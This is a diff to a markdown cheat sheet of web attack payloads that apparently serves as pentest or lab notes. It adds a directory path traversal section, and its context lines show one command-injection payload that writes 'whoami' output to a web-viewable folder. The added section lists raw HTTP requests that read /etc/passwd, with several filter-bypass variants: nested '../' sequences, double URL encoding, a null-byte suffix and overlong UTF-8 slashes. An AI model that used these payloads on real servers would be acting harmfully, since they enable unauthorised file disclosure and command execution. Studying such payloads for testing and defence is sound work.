@@ -2,6 +2,9 @@
 * [XSS](#xss)
 * [SQLi](#SQLi)
 * [Command Injection](#Cinject)
+* [Directory Path Traversal](#pathtrav)
+
+
 
 
 
@@ -291,6 +294,32 @@ Tests to see if there is a delay doing the ping
 Tests by putting output to a web viewable directory  
 `email=test%40gmail.com||whoami+>+/var/www/images/who.txt||&subject=test&message=test`
 
+
+
+# **<a name="pathtrav">Directory Path Traversal</a>**
+
+`GET /image?filename=../../../etc/passwd HTTP/1.1`
+
+Byapss Defensive filters
+
+`GET /image?filename=/etc/passwd HTTP/1.1`
+
+`GET /image?filename=....//....//....//etc//passwd HTTP/1.1`
+
+`GET /image?filename=..%252f..%252f..%252fetc%252fpasswd HTTP/1.1`
+
+`GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1`
+
+`GET /image?filename=../../../etc/passwd%00.png HTTP/1.1`
+
+odd characters or double encoded 
+
+`À¯`  
+`%c0%af`
+
+`/`  
+`%2f`  
+`%252f`  
 
 
 
